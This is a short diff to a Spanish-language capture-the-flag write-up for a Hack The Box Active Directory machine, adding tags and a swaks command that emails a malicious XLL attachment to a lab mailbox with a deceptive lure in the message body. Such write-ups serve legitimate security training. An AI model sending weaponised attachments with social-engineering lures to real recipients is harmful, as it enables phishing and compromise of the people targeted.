@@ -1,4 +1,4 @@
-# 
+#ActiveDirectory #hard #windows 
 ### Ping
 
 ```python
@@ -126,7 +126,7 @@ return 0;
 ### Enviamos el XLL a accounts@axlle.htb vía SMTP
 
 ```python
-
+swaks --to "accounts@axlle.htb" --from "gleoq@axlle.htb" --header "Subject: Open this exploit" --body "This is a picture of my girlfriend" --attach-type application/octet-stream --attach @exploit.xll --server axlle.htb --port 25 --timeout 20s
 ```
 
 ![[Pasted image 20240629113053.png]]
